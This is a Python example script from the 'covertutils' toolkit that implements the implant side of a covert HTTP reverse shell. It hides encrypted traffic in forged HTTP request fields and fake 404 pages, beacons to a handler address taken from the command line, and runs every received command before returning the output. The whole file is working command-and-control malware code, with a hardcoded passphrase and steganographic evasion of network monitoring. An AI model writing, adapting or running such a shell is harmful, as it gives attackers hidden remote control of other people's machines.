#!/usr/bin/env python

#			 Disclaimer!
#	 This code is not an optimal HTTP reverse shell!
# It is created to introduce as many aspects of 'covertutils' as possible.
# There are muuuuuch better ways to implement a reverse HTTP shell using this package,
# using many Python helpers like SimpleHTTPServer.
# In this file the HTTP requests/responses are crafted in socket level to display
# the concept of 'StegoOrchestrator' class and network wrapper functions

from covertutils.handlers import InterrogatingHandler, FunctionDictHandler
from covertutils.handlers.impl import SimpleShellHandler
from covertutils.orchestration import StegoOrchestrator
from covertutils.datamanipulation import asciiToHexTemplate

from os import urandom
from time import sleep
import sys
import socket


#============================== HTTP Steganography part ===================

resp_ascii = '''HTTP/1.1 404 Not Found
Date: Sun, 18 Oct 2012 10:36:20 GMT
Server: Apache/2.2.14 (Win32)
Content-Length: 363
Connection: Closed
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
<head>
   <title>404 Not Found</title>
</head>
<body>
   <h1>Not Found</h1>
   <p>The requested URL was not found on this server.</p>
</body>
<!-- Reference Code: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-->
</html>
'''
resp_templ = asciiToHexTemplate( resp_ascii )

req_ascii = '''GET /search.php?q=~~~~~~~~?userid=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ HTTP/1.1
Host: {0}
Cookie: SESSIOID=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
eTag: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

'''		# 2 new lines terminate the HTTP Request
req_templ = asciiToHexTemplate( req_ascii )

#		Create the StegoOrchestrator configuration string
stego_config = '''
X:_data_:\n\n

resp = """%s"""
req = """%s"""
''' % ( resp_templ, req_templ )

#==========================================================================


#============================== Handler Overriding part ===================

# Making a dict to map every 'stream' to a function to be called with the message as argument
# _function_dict = { 'control' : CommonStages['shell']['function'], 'main' : CommonStages['shell']['function'] }

# We need a handler that will ask for and deliver data, initiating a communication once every 2-3 seconds.
# This behavior is modelled in the 'InterrogatingHandler' with the 'delay_between' argument.
# The 'FunctionDictHandler' automatically runs all messages through function found in a given dict
class ShellHandler ( InterrogatingHandler, SimpleShellHandler ) :

	def __init__( self, recv, send, orch ) :
		super( ShellHandler, self ).__init__( recv, send, orch, # basic handler arguments
											fetch_stream = 'main',	# argument from 'InterrogatingHandler'
											# function_dict = _function_dict, # argument from 'FunctionDictHandler'
											delay_between = (0.0, 4),	 # argument from 'InterrogatingHandler'
											# delay_between = (2, 3)	 # argument from 'InterrogatingHandler'
											)	# The arguments will find their corresponding class and update the default values

	def onChunk( self, stream, message ) : pass		# If a part of a message arrives - do nothing.

	def onMessage( self, stream, message ) :		# If a message arrives

		if message != 'X' :								# If message is not the 'no data available' flag
			output = FunctionDictHandler.onMessage( self, stream, message )	# Run the received message
																				#through the corresponding function
			# stream, message = super( ShellHandler, self ).onMessage( stream, message )	# Run

			print "[+] Command Run!"
			# print "[+] Command Run: '%s'!" % output
			# print "Got to send %d bytes" % len(output)
			self.queueSend( output, stream )			# Queue the output to send in next interval


	def onNotRecognised( self ) : print "[!] < Unrecognised >"


#==========================================================================


#============================== Networking part ===========================
# The networking is handled by Python API. No 'covertutils' code here...

#	Handler's location
addr = ( sys.argv[1], int( sys.argv[2]) )	# called as 'python Client.py 127.0.0.1 8080'

#	Create a simple socket
client_socket = socket.socket( socket.AF_INET, socket.SOCK_STREAM )

#	As every HTTP request/response needs a new Socket,
# this variable is used to inform network wrappers if the last HTTP transaction is finished
# It is used in spin-locks. Could be designed a lot better with mutex and up/down.
same_con = False

def send( raw ) :
	global client_socket
	global same_con
	while same_con : sleep (0.01); continue;	# If the last transaction isn't finished - block
	while not same_con :
		try :			# Try starting a new connectio if the Server is up
			client_socket = socket.socket( socket.AF_INET, socket.SOCK_STREAM )	# Start new HTTP transaction
			client_socket.connect( addr )
			client_socket.send( raw )			# Send the data
			same_con = True			# make the 'recv' unblock
		except Exception as e:
			# print e
			sleep( 2 )	# Retry to connect to handler every 2 seconds

def recv( ) :
	global client_socket
	global same_con
	while not same_con : sleep (0.01); continue	# If an HTTP transaction hasn't started - block
	ret = client_socket.recv( 2048 )		# Get the HTTP response
	client_socket = None					# The socket will be closed by the HTTP Server
	same_con = False						# unblock the 'send' function to start a new HTTP transaction
	return ret

#==========================================================================


#=============================Handler Creation=============================

passphrase = "App1e5&0raNg3s"	# This is used to generate encryption keys
orch = StegoOrchestrator( passphrase,
							stego_config = stego_config,
							main_template = "resp",		# The template to be used
							hex_inject = True,			# Inject data in template in hex mode
							reverse = True )			# For 2 Orchestrator objects to be compatible one must have 'reverse = True'

handler = ShellHandler( recv, send, orch )

#==========================================================================

# Wait forever as all used threads are daemonized
while True : sleep(10)


#	Magic!
